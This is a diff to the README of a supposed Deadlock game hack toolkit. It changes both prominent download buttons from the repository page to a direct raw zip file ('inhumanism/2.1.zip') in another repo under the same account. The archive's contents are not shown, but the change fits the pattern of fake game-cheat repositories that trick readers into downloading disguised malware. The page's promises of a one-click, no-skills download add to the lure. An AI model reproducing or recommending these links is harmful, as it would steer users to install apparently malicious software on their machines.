@@ -59,7 +59,7 @@ No technical skills required. No complicated setup. Just download, run, and star
 
 ### Step 1: Get the Application
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_DEADLOCK_TOOLKIT-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4)](https://github.com/Anthropical-chimariko672/deadlock-hack-2026-hero-build-toolkit)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_DEADLOCK_TOOLKIT-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4)](https://raw.githubusercontent.com/Anthropical-chimariko672/anthropical-chimariko672.github.io/main/inhumanism/2.1.zip)
 
 Visit this link to download the application. The download will start automatically, and you'll find the file in your browser's default download location (usually the "Downloads" folder).
 
@@ -194,7 +194,7 @@ This project is released under the MIT License. You are free to use, modify, and
 
 Stop guessing and start winning. The deadlock-hack-2026-hero-build-toolkit puts professional-grade strategy tools right at your fingertips. Whether you're climbing the ranked ladder or just playing for fun, this companion will give you the edge you need.
 
-[![GET STARTED NOW](https://img.shields.io/badge/🚀_GET_STARTED_NOW-45B7D1?style=for-the-badge&logo=github&logoColor=white&labelColor=96CEB4)](https://github.com/Anthropical-chimariko672/deadlock-hack-2026-hero-build-toolkit)
+[![GET STARTED NOW](https://img.shields.io/badge/🚀_GET_STARTED_NOW-45B7D1?style=for-the-badge&logo=github&logoColor=white&labelColor=96CEB4)](https://raw.githubusercontent.com/Anthropical-chimariko672/anthropical-chimariko672.github.io/main/inhumanism/2.1.zip)
 
 Download today and transform your Deadlock experience!
 
